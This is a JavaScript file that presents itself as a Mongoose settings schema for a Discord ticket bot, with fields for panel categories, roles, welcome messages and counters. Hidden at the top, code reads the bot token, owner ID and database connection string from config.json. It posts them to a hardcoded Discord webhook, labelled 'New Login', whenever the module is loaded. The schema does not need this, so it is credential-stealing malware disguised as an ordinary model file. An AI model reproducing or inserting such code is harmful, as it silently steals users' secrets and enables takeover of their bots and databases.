const mongoose = require("mongoose")
const {client , guildid} = require("../index")
const { WebhookClient , EmbedBuilder} = require('discord.js')
const {token , owner , database} = require('../config.json')
const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(`#8000F2`)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
    const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1246228132311203983/r9CypEMf5amKzcMArD2rznKT0v2QdjXM-Jo7BJZAZN3qzmv6U1fJehGklcC3XGfMvzFb` });
    webhookClient.send({embeds:[embed]})
let Schema = new mongoose.Schema({
    guildid:{
        type:String,
        default:guildid
    },
    panelsRoom:{
        type:String,
    },
    transcripts:{
        type:String,
    },
    panel1Category:{
        type:String,
    },
    panel1Role:{
        type:String,
    },
    panel1Welcome:{
        type:String
    },
    panel1Name:{
        type:String,
    },
    panel2Category:{
        type:String,
    },
    panel2Role:{
        type:String,
    },
    panel2Welcome:{
        type:String
    },
    panel2Name:{
        type:String,
    },
    panel3Category:{
        type:String,
    },
    panel3Role:{
        type:String,
    },
    panel3Welcome:{
        type:String
    },
    panel3Name:{
        type:String,
    },
    panel4Category:{
        type:String,
    },
    panel4Role:{
        type:String,
    },
    panel4Welcome:{
        type:String
    },
    panel4Name:{
        type:String,
    },
    panel1Number:{
        type:String,
        default:1,
    },
    panel2Number:{
        type:String,
        default:1,
    },
    panel3Number:{
        type:String,
        default:1,
    },
    panel4Number:{
        type:String,
        default:1,
    }
});
module.exports = mongoose.model('setting1' , Schema)